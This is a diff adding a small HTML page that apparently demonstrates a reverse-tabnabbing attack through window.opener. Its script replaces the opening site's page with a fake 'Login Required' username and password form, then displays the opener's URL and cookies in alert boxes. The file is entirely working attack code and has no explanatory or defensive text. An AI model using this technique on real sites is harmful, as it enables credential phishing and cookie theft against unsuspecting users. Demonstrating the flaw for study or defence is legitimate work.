@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<script type="text/javascript">
+	window.opener.document.body.innerHTML = '<h1>Login Required</h1> <p><input type="text" placeholder="login"/><br/><input type="password" placeholder="password"/></p><input type="submit" />';
+	alert('You came from' + window.location.href);
+	alert('Here is your cookies from that world' + window.opener.document.cookie);
+</script>
+</body>
+</html>
